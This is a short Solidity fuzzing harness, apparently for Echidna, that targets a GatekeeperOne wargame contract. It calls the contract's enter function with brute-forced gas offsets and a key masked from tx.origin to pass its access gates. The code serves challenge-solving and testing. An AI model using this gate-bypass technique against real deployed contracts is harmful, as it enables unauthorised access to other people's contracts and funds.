pragma solidity ^0.5.0;

import 'contract.sol';

contract Test {
  using SafeMath for uint256;
  GatekeeperOne g;

  constructor() public { g = new GatekeeperOne(); }

  function unlock(uint16 x) public {
    uint64 mask = 0xFF0000FFFF;
    address(g).call.gas(8192 * 100 + x % 8191)(abi.encodeWithSignature("enter(bytes8)", bytes8(uint64(tx.origin) & mask)));
  }

  function echidna_test_entrant() public returns (bool) {
    return g.entrant() == address(0);
  }
}
